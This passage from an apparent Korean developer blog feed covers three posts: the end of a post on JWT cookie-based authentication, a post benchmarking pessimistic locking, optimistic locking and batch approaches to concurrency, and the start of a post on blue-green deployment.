      &lt;li&gt;Refresh 토큰만으로 DB 조회 없이 Access 토큰 신규 발행이 가능하다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;클라이언트
    &lt;ul&gt;
      &lt;li&gt;/login 엔드포인트로 ID와 Password를 요청에 담아 보낸다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;서버 - JWT 발행
    &lt;ul&gt;
      &lt;li&gt;ID와 Password가 유효하다면 Access 토큰과 Refresh 토큰을 &lt;br /&gt;
httpOnly = true 쿠키에 담아 응답에 담는다.&lt;/li&gt;
      &lt;li&gt;Access 토큰과 Refresh 토큰의 생명주기가 동일한 더미 힌트 쿠키도&lt;br /&gt;
httpOnly = false 쿠키에 담고 응답에 담는다.&lt;/li&gt;
      &lt;li&gt;클라이언트로 응답한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;클라이언트
    &lt;ul&gt;
      &lt;li&gt;/login 응답이 성공적으로 도착하였고, 더미 힌트 쿠키가 존재한다면&lt;br /&gt;
인증에 성공하였다고 판단한다.&lt;/li&gt;
      &lt;li&gt;더미 힌트 쿠키는 프론트에서 [로그인 /로그아웃 버튼]과 같이&lt;br /&gt;
로그인 여부를 판별해야 하는 상황에서 사용한다.&lt;/li&gt;
      &lt;li&gt;인증이 필요한 요청을 보낼때&lt;br /&gt;
Refresh 토큰 더미 힌트 쿠키의 만료시간이 얼마 안 남았다면&lt;br /&gt;
새 Refresh  토큰 발급 API에 요청한다.&lt;/li&gt;
      &lt;li&gt;Refresh 토큰 더미 쿠키가 만료되어 없어졌다면&lt;br /&gt;
로그인 창으로 리다이렉트하여 사용자가 직접 인증하도록 유도한다.&lt;/li&gt;
      &lt;li&gt;서버에서 401 에러를 받았다면 로그인 창으로 리다이렉트하여&lt;br /&gt;
사용자가 직접 인증하도록 유도한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;서버
    &lt;ul&gt;
      &lt;li&gt;Refresh 토큰이 유효하지 않다.
        &lt;ul&gt;
          &lt;li&gt;현재 존재하는 요청에 담긴 Access 토큰과 Refresh 토큰을 만료시키고&lt;br /&gt;
401 에러로 응답한다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Refresh 토큰은 유효한데 Access 토큰이 만료되었다.
        &lt;ul&gt;
          &lt;li&gt;Refresh 토큰으로 Access 토큰을 새로 발행한다.&lt;/li&gt;
          &lt;li&gt;이때 공격자가 의도적으로 잘못된 Access 토큰을 넣을 가능성도 있으므로&lt;br /&gt;
CSRF 토큰을 도입하여 의도하지 않은 악의적 요청을 최대한 막는다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Refresh 토큰도 유효하고 Access 토큰도 유효하다.
        &lt;ul&gt;
          &lt;li&gt;기존에 발행된 Access 토큰으로 인증 처리를 한다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;가장-보안적으로-그나마-안정적인-방식&quot;&gt;가장 보안적으로 그나마 안정적인 방식&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;인증 정보는 httpOnly = true, samesite = lax, secure = true 쿠키에&lt;br /&gt;
담아 프론트에서 javascript로 조회할 수 없게 한다.&lt;br /&gt;
(XSS 공격 방어)&lt;/li&gt;
  &lt;li&gt;CSRF 토큰을 사용하여 CSRF 공격을 막는다.&lt;/li&gt;
  &lt;li&gt;CORS 설정을 하여 웹 브라우저에서 서비스에서 의도하지 않은&lt;br /&gt;
AJAX 통신을 막는다.&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="Authentication" /><category term="jwt" /><category term="essay" /><summary type="html">세션 인증 방식과 JWT 인증 방식의 차이 세션 방식 서버에서 사용자 정보를 key-value 저장소에 저장 서버에서 key를 사용자 쿠키에 담아서 전송 사용자가 인증이 필요한 요청을 하면 요청과 함께 키가 담긴 쿠키가 서버로 전송됨 서버는 key를 가지고 key-value 저장소를 조회하여 인증정보가 유효함을 확인함 세션 방식의 문제 인증 정보가 key-value 저장소에 저장되기 때문에 인증 요청이 많아질수록 key-value 저장소에 저장되는 인증 정보량도 증가함 인증이 필요한 요청마다 key-value 저장소를 조회하기 때문에 인증 정보가 너무 많이 저장된 경우 조회 성능도 줄어든다. 한 명의 유저가 여러 디바이스를 가지고 다중 접속하는 경우도 많아지기에 key-value 저장소가 성능 문제를 일으킬수도 있다. JWT(Json Web Token) 인증정보를 key-value 저장소에 저장하는게 아니라 사용자 고유키를 포함한 몇 가지 정보를 쿠키에 담거나, 응답으로 준 뒤 헤더(Authorization) 받는 방법이다. 이때 클라이언트에서 임의로 사용자 고유키를 변경하는 것을 막기 위해 전자서명을 담아서 위조를 방지한다. 전자서명(Signature) 생성 Header + Payload를 Base64Url 인코딩 Base64Url(Header + “.” + Payload)의 해시(SHA-256)를 생성 비밀키(Private Key)로 해시 값을 암호화하여 Signature 생성 Header.Payload.Signature 형태의 JWT 응답 전자서명 검증 JWT에서 Header, Payload, Signature 분리 Header + Payload를 Base64Url 인코딩 (클라이언트가 보낸 값 그대로 사용) Base64Url(Header + “.” + Payload)의 해시(SHA-256)를 계산 공개키(Public Key)로 Signature를 검증 Signature를 공개키로 복호화 복호화된 값(원래 해시)과 직접 계산한 해시 값 비교 일치하면 유효한 토큰, 다르면 위조된 토큰 JWT 운영 Access 토큰 사용자 고유키를 포함한 몇 가지 정보가 담긴 토큰 인증 여부를 판별할때 사용하기에 유효기간을 짧게 두어 토큰이 탈취되었을 때 위험을 최소화한다. Refresh 토큰 Access 토큰을 재발행할 때 사용하는 토큰이다. Refresh 토큰이 유효하다면 Refresh 토큰을 이용하여 Access 토큰을 재발행한다. JWT 인증이 세션 방식보다 좋은 점 key-value 저장소를 운영하지 않을 수 있다. 이미 사용자 정보가 Access 토큰에 포함되어 있기 때문에 key-value 저장소를 운영할 필요가 없다. 다만 Refresh 토큰 탈취를 대비하여 블랙리스트 제도를 도입한다면 key-value 저장소를 운영해야한다. 하지만 이때에도 블랙리스트로 등록된 refresh 토큰만 조회하므로 세션 key-value 스토어보다 저장되는 데이터는 적다. DB 조회 최소화 극단적으로 사용자 고유키 외에 인증에 필요한 다양한 정보 (이름, 닉네임, 생년월일) 등을 JWT에 저장하면 DB 조회 수를 줄일 수 있다. 다만 많은 정보를 저장할수록 JWT 길이가 길어져서 인증이 필요한 요청을 할때마다 주고 받는 데이터 양이 증가한다. JWT payload는 JWT 토큰 탈취 시에 그대로 노출되기 때문에 생년월일 등의 민감정보는 저장하지 않는 것이 좋다. 그래서 어떤 방법을 선택? 현재 팀은 JWT 인증 방식 경험이 더 많으므로 JWT 인증 방식 선택 JWT payload에는 사용자 고유키만 포함</summary></entry><entry><title type="html">동시성 문제 해결 방안 성능 실험</title><link href="https://a3magic3pocket.github.io/posts/solving-concurrency-problems-with-performance-in-mind/" rel="alternate" type="text/html" title="동시성 문제 해결 방안 성능 실험" /><published>2025-04-06T08:48:05+09:00</published><updated>2025-04-11T22:27:26+09:00</updated><id>https://a3magic3pocket.github.io/posts/solving-concurrency-problems-with-performance-in-mind</id><content type="html" xml:base="https://a3magic3pocket.github.io/posts/solving-concurrency-problems-with-performance-in-mind/">&lt;h2 id=&quot;동시성-문제란&quot;&gt;동시성 문제란?&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;여러 프로세스나 스레드가 동시에 실행되는 상황에서 자원(데이터 등)을 &lt;br /&gt;
제대로 공유하거나 수정하지 못해 발생하는 문제&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;구체적인-상황&quot;&gt;구체적인 상황&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;id, numLikes 필드로 이뤄진 POST 테이블이 있다.&lt;/li&gt;
  &lt;li&gt;likePost 함수는 postId를 인자로 받고, &lt;br /&gt;
post을 조회한 뒤 기존 numLikes를 읽고 그 값에 +1을 한 값을 저장한다.&lt;/li&gt;
  &lt;li&gt;이때 두 트랜잭션이 동시에 likePost 함수를 호출하면&lt;br /&gt;
둘 중 하나의 트랜잭션은 덮어쓰기 되어 갱신이 소실된다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;해결-방법&quot;&gt;해결 방법&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;비관적 락(pessimistic lock)
    &lt;ul&gt;
      &lt;li&gt;DB에서 대상이 되는 POST.id 행을 배타적 잠금한다.&lt;/li&gt;
      &lt;li&gt;락을 확보한 트랜잭션이 작업을 완료할때까지&lt;br /&gt;
다른 트랜잭션들은 대기한다.&lt;/li&gt;
      &lt;li&gt;대기가 길어서 트랜잭션 타임아웃 시간을 초과하면 &lt;br /&gt;
트랜잭션은 실패하고 롤백 처리된다.&lt;/li&gt;
      &lt;li&gt;배타적 잠금이기 때문에 조회도 대기하게 된다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;낙천적 락(optimistic lock)
    &lt;ul&gt;
      &lt;li&gt;version 필드를 두어서 이를 애플리케이션에서 처리하여&lt;br /&gt;
동시성 문제를 해결한다.&lt;/li&gt;
      &lt;li&gt;likePost 함수의 경우 어떻게 동작하는지 설명한다.&lt;/li&gt;
      &lt;li&gt;조회 단계
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT id, numLikes, version FROM POST WHERE id = 1&lt;/code&gt;&lt;br /&gt;
실행한 결과 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;numLikes = 1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version = 1&lt;/code&gt;을 받는다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;수정 작업
        &lt;ul&gt;
          &lt;li&gt;numLikes를  2로 업데이트 한다.&lt;br /&gt;
version도 2로 업데이트 한다.&lt;br /&gt;
이때 where 절에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version = 1&lt;/code&gt;을 추가한다.&lt;/li&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UPDATE POST   
SET numLikes = 2, version = 2  
WHERE id = 1 AND version = 1&lt;/code&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Optimistic Locking 동작 (버전 비교)
        &lt;ul&gt;
          &lt;li&gt;정상적인 경우
            &lt;ul&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version = 1&lt;/code&gt;로 읽어온 객체가 수정되어 저장될때,&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version = 1&lt;/code&gt;이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UPDATE&lt;/code&gt; 쿼리의 조건에 포함되므로,&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version = 1&lt;/code&gt;인 데이터가 존재하면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UPDATE&lt;/code&gt;가 &lt;br /&gt;
정상적으로 실행된다.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;경쟁 상태
            &lt;ul&gt;
              &lt;li&gt;만약 첫 번째 스레드가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version = 1&lt;/code&gt;로 numLikes를 읽은 후,&lt;br /&gt;
두 번째 스레드에서 numLikes를 수정하여 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version = 2&lt;/code&gt;로 갱신했다면,&lt;br /&gt;
첫 번째 스레드는 더 이상 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version = 1&lt;/code&gt;을 가진 데이터를 &lt;br /&gt;
수정할 수 없다.&lt;/li&gt;
              &lt;li&gt;이 경우, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UPDATE&lt;/code&gt; 쿼리가 영향을 미치지 않게 되며&lt;br /&gt;
애플리케이션(예를 들면 스프링)에서 &lt;br /&gt;
예외(OptimisticLockingFailureException)를 발생시킨다.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;단일 스레드, 비동기 배치 처리
    &lt;ul&gt;
      &lt;li&gt;동시성 문제는 여러 프로세스나 스레드에서 동시에 &lt;br /&gt;
특정 자원을 점유할때 발생한다.&lt;/li&gt;
      &lt;li&gt;단일스레드만 사용하여 자원을 점유하게 하면&lt;br /&gt;
동시성 문제를 막을 수 있다.&lt;/li&gt;
      &lt;li&gt;배치 작업을 위하여 요청과 처리를 분리한다.&lt;/li&gt;
      &lt;li&gt;요청
        &lt;ul&gt;
          &lt;li&gt;레디스와 같은 단일스레드 메세지 큐를 두고&lt;br /&gt;
요청은 레디스 메세지 큐에 쌓는다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;처리
        &lt;ul&gt;
          &lt;li&gt;메세지 큐에서 꺼내어 작업뭉치를 꺼낸뒤 &lt;br /&gt;
비동기로 배치 작업을 처리하는 프로그램을 단일 스레드로 운영한다.&lt;/li&gt;
          &lt;li&gt;예를들면 큐에서 3개의 작업을 꺼낸다.
            &lt;ul&gt;
              &lt;li&gt;likePost(postId = 1)&lt;/li&gt;
              &lt;li&gt;likePost(postId = 2)&lt;/li&gt;
              &lt;li&gt;likePost(postId = 3)&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;autoCommit = false로 전환한뒤&lt;br /&gt;
3개의 작업을 진행한다.&lt;/li&gt;
          &lt;li&gt;문제가 없다면 commit하고 문제가 있으면 롤백한다.&lt;br /&gt;
이때 롤백이 되면 3개 작업 모두 롤백된다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;실험-환경&quot;&gt;실험 환경&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;웹 프레임워크: 스프링부트, 코틀린&lt;/li&gt;
  &lt;li&gt;DB: 마리아디비&lt;/li&gt;
  &lt;li&gt;메세지 큐: 레디스 리스트&lt;/li&gt;
  &lt;li&gt;테스트 툴: k6&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;테스트-환경&quot;&gt;테스트 환경&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;k6 설정
    &lt;ul&gt;
      &lt;li&gt;가상사용자 수(vus): 100개&lt;/li&gt;
      &lt;li&gt;총 요청 수 (iterations): 3000개 또는 6000개&lt;/li&gt;
      &lt;li&gt;시간 (duration): 5분&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;k6 설정 설명
    &lt;ul&gt;
      &lt;li&gt;100 명의 유저가 3000개 요청을 5분 동안 동시에 진행한다.&lt;/li&gt;
      &lt;li&gt;5분이 되기 전에 총 요청 수가 3000에 도달하면 중지한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;pessimistic lock 설정
    &lt;ul&gt;
      &lt;li&gt;timeout: 5초&lt;/li&gt;
      &lt;li&gt;격리수준(isolation level): REPEATABLE_READ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;optimistic lock 설정
    &lt;ul&gt;
      &lt;li&gt;timeout: 20초&lt;/li&gt;
      &lt;li&gt;격리수준: REPEATABLE_READ&lt;/li&gt;
      &lt;li&gt;OptimisticLockingFailureException 발생 시 최대 허용 재시도 수: 30&lt;/li&gt;
      &lt;li&gt;OptimisticLockingFailureException 발생 시 대기시간: 0.1초&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;단일 스레드, 비동기 배치 처리 설정
    &lt;ul&gt;
      &lt;li&gt;DB timeout: 5초&lt;/li&gt;
      &lt;li&gt;DB 격리수준: REPEATABLE_READ&lt;/li&gt;
      &lt;li&gt;비동기 배치 함수 배치 크기: 20개&lt;/li&gt;
      &lt;li&gt;비동기 배치 함수가 담긴 스프링 스케쥴러 fixedDelay: 0.1초
        &lt;ul&gt;
          &lt;li&gt;fixedDelay는 이전 작업이 완료된 후 재시도 하기 전까지 대기 시간&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;테스트-시나리오&quot;&gt;테스트 시나리오&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;1번 시나리오
    &lt;ul&gt;
      &lt;li&gt;단순 문자열만 리턴하는 컨트롤러 조회&lt;/li&gt;
      &lt;li&gt;실험의 대조군으로 사용하기 위해 조회&lt;/li&gt;
      &lt;li&gt;naive 요청 3000번 조회&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2번 시나리오
    &lt;ul&gt;
      &lt;li&gt;한 요청에서 ‘likePost(postId = someId)’만 실행&lt;br /&gt;
즉, 한 트랜잭션에서 조회 및 갱신 요청만 실행&lt;/li&gt;
      &lt;li&gt;요청 3000번 실행&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;3번 시나리오
    &lt;ul&gt;
      &lt;li&gt;한 요청에서 ‘모든 post 목록 조회’와  &lt;br /&gt;
‘likePost(postId = someId)’를 묶어서 실행&lt;br /&gt;
즉, 한 트랜잭션에서 조회 한 번, 한 트랜잭션에서 조회 및 갱신 요청 한 번&lt;/li&gt;
      &lt;li&gt;모든 post 목록 조회 3000번, &lt;br /&gt;
likePost(postId = someId) 3000번 실행&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;4번 시나리오
    &lt;ul&gt;
      &lt;li&gt;한 요청에서 ‘모든 post 목록 조회’ 또는 ‘likePost(postId = someId)’를 실행&lt;br /&gt;
이때 ‘모든 post 목록 조회’를 전체 요청 수의 90%를 진행하고 ‘likePost(postId = someId)’는 전체 요청 수의 10%만 진행&lt;/li&gt;
      &lt;li&gt;모든 post 목록 조회 5400번,&lt;br /&gt;
likePost(postId = someId) 600번 실행&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;결과&quot;&gt;결과&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;1번 시나리오 - naive 요청
    &lt;ul&gt;
      &lt;li&gt;총 요청 수: 3000&lt;/li&gt;
      &lt;li&gt;총 실패 수: 0&lt;/li&gt;
      &lt;li&gt;테스트 완료 시간(ms): 3363.41&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2번 시나리오 - likePost 만 진행
    &lt;ul&gt;
      &lt;li&gt;pessimistic lock
        &lt;ul&gt;
          &lt;li&gt;총 요청 수: 3000&lt;/li&gt;
          &lt;li&gt;총 실패 수: 0&lt;/li&gt;
          &lt;li&gt;테스트 완료 시간(ms): 20111.89&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;optimistic lock
        &lt;ul&gt;
          &lt;li&gt;총 요청 수: 3000&lt;/li&gt;
          &lt;li&gt;총 실패 수: 0&lt;/li&gt;
          &lt;li&gt;테스트 완료 시간(ms): 31873.77&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;단일 스레드, 비동기 배치 처리
        &lt;ul&gt;
          &lt;li&gt;총 요청 수: 3000&lt;/li&gt;
          &lt;li&gt;총 실패 수: 0&lt;/li&gt;
          &lt;li&gt;테스트 완료 시간(ms): 17954.14&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;3번 시나리오 - 모든 post 조회와 likePost  1대1 처리
    &lt;ul&gt;
      &lt;li&gt;pessimistic lock
        &lt;ul&gt;
          &lt;li&gt;총 요청 수: 6000&lt;/li&gt;
          &lt;li&gt;총 실패 수: 0&lt;/li&gt;
          &lt;li&gt;테스트 완료 시간(ms): 27453.60&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;optimistic lock
        &lt;ul&gt;
          &lt;li&gt;총 요청 수: 6000&lt;/li&gt;
          &lt;li&gt;총 실패 수: 0&lt;/li&gt;
          &lt;li&gt;테스트 완료 시간(ms): 37709.28&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;단일 스레드, 비동기 배치 처리
        &lt;ul&gt;
          &lt;li&gt;총 요청 수: 6000&lt;/li&gt;
          &lt;li&gt;총 실패 수: 0&lt;/li&gt;
          &lt;li&gt;테스트 완료 시간(ms): 23220.97&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;4번 시나리오 - 모든 post 조회와 likePost  1대9 처리
    &lt;ul&gt;
      &lt;li&gt;pessimistic lock
        &lt;ul&gt;
          &lt;li&gt;총 요청 수: 6000&lt;/li&gt;
          &lt;li&gt;총 실패 수: 0&lt;/li&gt;
          &lt;li&gt;테스트 완료 시간(ms): 16909.48&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;optimistic lock
        &lt;ul&gt;
          &lt;li&gt;총 요청 수: 6000&lt;/li&gt;
          &lt;li&gt;총 실패 수: 0&lt;/li&gt;
          &lt;li&gt;테스트 완료 시간(ms): 24357.44&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;단일 스레드, 비동기 배치 처리
        &lt;ul&gt;
          &lt;li&gt;총 요청 수: 6000&lt;/li&gt;
          &lt;li&gt;총 실패 수: 0&lt;/li&gt;
          &lt;li&gt;테스트 완료 시간(ms): 20432.77&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;의의&quot;&gt;의의&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;모든 경우에서 optimistic lock 보다 pessimistic lock의 처리속도가 더 빨랐다.&lt;/li&gt;
  &lt;li&gt;optimistic lock의 경우, 실패 후 재시도 시간을 너무 길게 잡으면&lt;br /&gt;
처리 속도가 엄청나게 느려지며, 재시도 시간이 너무 긴 경우 &lt;br /&gt;
DB 타임아웃이 발생하여 트랜잭션이 실패한다.&lt;/li&gt;
  &lt;li&gt;읽기 비중이 높은 환경에서는 모든 케이스에서 처리시간이 단축되었으며,&lt;br /&gt;
특히 Optimistic lock은 Pessimistic lock보다 더 큰 성능 개선 효과를 보였다.&lt;/li&gt;
  &lt;li&gt;pessimistic lock과 optimistic lock 모두에서 &lt;br /&gt;
시나리오 3번(쓰기:읽기 = 1:1)보다 4번(쓰기:읽기=1:9)이 테스트 종료 시간이 더 짧았다.&lt;br /&gt;
또한 시나리오 3과 4 간의 성능 향상 폭은 Optimistic lock에서 더 크게 나타났다.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;단일 스레드, 비동기 배치 처리&lt;/code&gt;는 모든 시나리오에서 상대적으로 일정한 처리 속도를 보인다.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;단일 스레드, 비동기 배치 처리&lt;/code&gt;는 처리가 비동기로 이뤄지기 때문에&lt;br /&gt;
테스트가 종료된 후 일정 시간이 지나야 처리가 완료된다.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;단일 스레드, 비동기 배치 처리&lt;/code&gt;는 스케쥴러 대기 시간을 길게 설정하거나 배치 크기를 줄일 경우, 처리가 완료되는 시간이 엄청나게 늘어난다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;결론&quot;&gt;결론&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;여러 스레드에서 동시에 WRITE가 발생할 상황이 조금이라도 생긴다면&lt;br /&gt;
pessimistic lock을 쓰는게 더 유리한 것으로 보인다.&lt;/li&gt;
  &lt;li&gt;optimistic lock의 경우 timeout 시간과 재시도 대기 시간을 잘 설정해야만&lt;br /&gt;
성능이 좋아진다.&lt;/li&gt;
  &lt;li&gt;예를 들어 현재 테스트 시나리오에서 optimistic lock의 timeout을 &lt;br /&gt;
5로 했을때보다 20으로 했을때가 처리시간이 더 짧다.&lt;br /&gt;
아마도 timeout 시간이 짧으면 재시도 대기를 하는 요청도&lt;br /&gt;
늘어나기 때문에 전반적인 처리 시간이 늘어나는 것으로 추정한다.&lt;/li&gt;
  &lt;li&gt;3번 시나리오에 비해 4번 시나리오의 처리 속도는&lt;br /&gt;
optimistic lock이 pessimistic lock 보다 더 많이 향상되었다.&lt;br /&gt;
이를 통해 충돌이 거의 없는 환경에서는 optimistic lock이 &lt;br /&gt;
pessimistic lock보다 더 처리속도가 빠를 것으로 추정한다.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;단일 스레드, 비동기 배치 처리&lt;/code&gt; 는 다른 방법에 비해 &lt;br /&gt;
상대적으로 균일한 처리 속도를 보여준다.&lt;br /&gt;
하지만 비동기이기 때문에 실시간으로 조회가 이뤄져야 하는 경우&lt;br /&gt;
사용하기 어렵다.&lt;br /&gt;
비동기 스케줄러 시간을 줄이면 전반적인 처리 속도는 상승한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;예시-github-repository&quot;&gt;예시 github repository&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/a3magic3pocket/concurrency-control-sandbox&quot; target=&quot;_blank&quot;&gt;concurrency-control-sandbox&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="Concurrency" /><category term="k6" /><category term="lock" /><category term="essay" /><summary type="html">동시성 문제란? 여러 프로세스나 스레드가 동시에 실행되는 상황에서 자원(데이터 등)을 제대로 공유하거나 수정하지 못해 발생하는 문제</summary></entry><entry><title type="html">블루 - 그린 배포 실험</title><link href="https://a3magic3pocket.github.io/posts/experimenting-with-blue-green-deployments/" rel="alternate" type="text/html" title="블루 - 그린 배포 실험" /><published>2025-04-06T08:47:25+09:00</published><updated>2025-05-08T21:47:25+09:00</updated><id>https://a3magic3pocket.github.io/posts/experimenting-with-blue-green-deployments</id><content type="html" xml:base="https://a3magic3pocket.github.io/posts/experimenting-with-blue-green-deployments/">&lt;h2 id=&quot;블루---그린-배포란&quot;&gt;블루 - 그린 배포란?&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;두 개의 동일한 환경(블루와 그린)을 유지하며, &lt;br /&gt;
새 버전을 배포한 후 트래픽을 전환하여 새로운 버전을 운영에 적용&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;왜-하는가&quot;&gt;왜 하는가?&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;새로운 애플리케이션 버전을 배포하면서 서비스 중단 없이&lt;br /&gt;
안전하게 전환하기 위해서&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;작동-방식&quot;&gt;작동 방식&lt;/h2&gt;
&lt;ol&gt;
  &lt;li&gt;블루 환경에서 운영 중
    &lt;ul&gt;
      &lt;li&gt;기존 애플리케이션(블루)이 사용자의 모든 트래픽을 처리하고 있음&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;그린 환경에서 새 버전 배포
    &lt;ul&gt;
      &lt;li&gt;새로운 애플리케이션 버전을 그린 환경에 배포한 뒤 테스트 수행&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;트래픽 전환
    &lt;ul&gt;
      &lt;li&gt;모든 트래픽을 블루 환경에서 그린 환경으로 전환&lt;/li&gt;
      &lt;li&gt;이 작업은 로드밸런서를 재설정하거나 DNS를 업데이트 하는 방식으로 수행&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;블루 환경 유지(롤백 대비)
    &lt;ul&gt;
      &lt;li&gt;그린 환경으로의 전환 후에도 블루 환경은 일정 시간 동안 유지하며&lt;br /&gt;
문제가 발생하면 즉시 롤백할 수 있도록 준비&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;장점&quot;&gt;장점&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;서비스 중단 없이 배포
    &lt;ul&gt;
      &lt;li&gt;기존 환경은 유지되므로, 배포 중에도 사용자는 끊김 없는 서비스 이용 가능&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;빠른 롤백 가능
    &lt;ul&gt;
      &lt;li&gt;문제가 발생하면 그린 환경을 비활성하고 다시 블루로 트래픽 전환 가능&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;테스트 환경 제공
    &lt;ul&gt;
      &lt;li&gt;그린 환경에서 운영 환경과 동일한 조건으로 충분히 테스트 진행 가능&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;배포 리스크 최소화
    &lt;ul&gt;
      &lt;li&gt;새로운 버전 문제로 인해 운영 환경이 중단될 가능성을 크게 줄임&lt;/li&gt;
    &lt;/ul&gt;
